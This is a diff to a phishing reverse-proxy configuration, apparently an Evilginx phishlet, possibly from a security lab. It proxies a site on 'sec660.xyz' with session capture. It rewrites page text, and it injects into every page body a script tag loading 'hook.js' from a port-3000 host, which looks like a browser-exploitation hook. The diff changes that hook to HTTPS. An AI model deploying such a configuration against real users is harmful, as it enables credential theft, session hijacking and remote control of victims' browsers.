@@ -1,15 +1,14 @@
 min_ver: '3.2.0'
 proxy_hosts:
   - {phish_sub: '', orig_sub: 'ubuntu', domain: 'sec660.xyz', session: true, is_landing: true, auto_filter: true}
-#  - {phish_sub: '', orig_sub: '', domain: 'sec660.xyz', session: true, is_landing: false}
 
 sub_filters:
   - {triggers_on: 'ubuntu.sec660.xyz', orig_sub: 'ubuntu', domain: 'sec660.xyz', search: 'https://{hostname}/', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-www-form-urlencoded' ]}
-  - {triggers_on: 'ubuntu.sec660.xyz', orig_sub: 'ubuntu', domain: 'sec660.xyz', search: 'Sign In', replace: 'login', mimes: ['text/html']}
+  - {triggers_on: 'ubuntu.sec660.xyz', orig_sub: 'ubuntu', domain: 'sec660.xyz', search: 'Sign In', replace: 'login', mimes: []}
   - { 
       triggers_on: '.*', 
       search: '<body>', 
-      replace: '<body><script src="http://ubuntu.sec600.xyz:3000/hook.js"></script>', 
+      replace: '<body><script src="https://ubuntu.sec600.xyz:3000/hook.js"></script>', 
       mimes: [] 
     }
 auth_tokens:
